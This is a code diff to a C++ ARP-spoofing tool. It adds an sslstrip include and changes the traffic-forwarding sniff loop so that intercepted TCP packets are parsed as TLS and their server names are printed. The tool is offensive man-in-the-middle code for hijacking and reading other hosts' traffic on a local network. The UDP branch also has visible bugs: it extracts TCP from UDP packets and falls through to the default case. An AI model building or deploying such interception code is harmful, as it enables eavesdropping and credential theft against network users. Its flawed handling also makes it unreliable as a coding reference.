@@ -1,4 +1,5 @@
 #include "./arpspoof.h"
+#include "../sslstrip/sslstrip.h"
 #include <unistd.h>
 
 using std::cout;
@@ -51,25 +52,35 @@ void ArpSpoofer::ipForward(IPv4Address to, IPv4Address from, HWAddress<6> toHw,
         sniffer.sniff_loop([=](PDU& pdu) {
             PDU* newPdu;
             EthernetII newEth;
-
+            TCP tmp;
+            byte_array b;
+            
             cout << "catched " + from.to_string() << endl;
             
             switch (pdu.rfind_pdu<IP>().inner_pdu()->pdu_type())
             {
-                case PDU::PDUType::TCP :
+                case PDU::PDUType::TCP :{
                     cout << "TCP" << endl;                    
-                    newEth = EthernetII(toHw,info.hw_addr)/IP(to,myIp)/pdu.rfind_pdu<TCP>();                    
+                    tmp=pdu.rfind_pdu<TCP>();
+                    b=tmp.serialize();
+                    TLS tls(b);
+                    newEth = EthernetII(toHw,info.hw_addr)/IP(to,myIp)/tmp;   
+                    cout<<tls.servername()<<endl;                                     
                     break;
+                }
                 
-                case PDU::PDUType::UDP :
+                case PDU::PDUType::UDP :{
                     cout << "UDP" << endl;
                     newEth = EthernetII(toHw,info.hw_addr)/IP(to,myIp)/pdu.rfind_pdu<TCP>();
-                default:                  
+                }
+                
+                default:{
                     cout << "NOT DECLEARED" << endl;
                     auto dump =pdu.rfind_pdu<IP>().inner_pdu()->serialize();
                     cout<<std::string(dump.begin(),dump.end())<<endl;
                     newEth = EthernetII(toHw,info.hw_addr)/IP(to,myIp)/pdu.rfind_pdu<RawPDU>();
                     break;
+                }
             }
             return true;
         });
